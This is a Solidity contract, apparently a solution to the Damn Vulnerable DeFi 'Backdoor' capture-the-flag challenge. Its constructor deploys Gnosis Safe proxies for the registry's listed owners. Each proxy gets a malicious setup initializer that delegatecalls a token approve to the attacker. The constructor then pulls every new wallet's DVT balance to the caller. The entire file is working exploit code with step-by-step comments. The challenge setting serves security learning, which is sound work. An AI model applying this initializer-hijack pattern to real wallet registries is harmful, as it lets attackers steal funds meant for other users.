// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {GnosisSafeSetupTo} from "./GnosisSafeSetupTo.sol";
import {IDamnValuableToken} from "./IDamnValuableToken.sol";
import {IGnosisSafe} from "./IGnosisSafe.sol";
import {IGnosisSafeProxyFactory} from "./IGnosisSafeProxyFactory.sol";
import {IWalletRegistry} from "./IWalletRegistry.sol";

contract GnosisSafeProxyAttacker {
    constructor(
        address _masterCopy,
        address _walletFactory,
        address _dvt,
        address _walletRegistry,
        address[] memory _owners
    ) {
        IGnosisSafeProxyFactory walletFactory = IGnosisSafeProxyFactory(
            _walletFactory
        );
        IDamnValuableToken dvt = IDamnValuableToken(payable(_dvt));
        IWalletRegistry walletRegistry = IWalletRegistry(_walletRegistry);

        // 1. Deploy the contract that will be `delegatecall` by the new deployed GnosisSafeProxy (which contains the
        // `IDamnValuableToken.approve()` call needed to transfer the 10 DVT from the safe to this attacker contract)
        GnosisSafeSetupTo to = new GnosisSafeSetupTo();

        // 2. Iterate per owner
        uint256 ownersLength = _owners.length;
        for (uint256 i; i < ownersLength; ) {
            address[] memory owners = new address[](1);
            owners[0] = _owners[i];

            // 2a. Encode the `GnosisSafe.setup()` call, which contains the encoded delegatecall
            // NB: https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol#L75
            bytes memory initializer = abi.encodeWithSelector(
                IGnosisSafe.setup.selector,
                owners, // owners
                1, // threshold
                address(to), // to, the custom made contract that contains the DVT `approve()` call
                abi.encodeWithSelector(
                    to.approve.selector,
                    _dvt,
                    address(this)
                ), // data, the `IDamnValuableToken.approve()` call encoded
                address(0), // fallbackHandler, NA
                address(0), // paymentToken, NA
                0, // payment, NA
                address(0) // paymentReceiver, NA
            );

            // 2b. Create the owners's proxy via the proxy factory
            address proxy = address(
                walletFactory.createProxyWithCallback(
                    _masterCopy,
                    initializer,
                    i, // nonce
                    walletRegistry
                )
            );

            // 2c. Transfer the proxy DVT balance to the player address
            uint256 dvtBalance = dvt.balanceOf(address(proxy));
            dvt.transferFrom(proxy, msg.sender, dvtBalance);
            unchecked {
                ++i;
            }
        }
    }
}
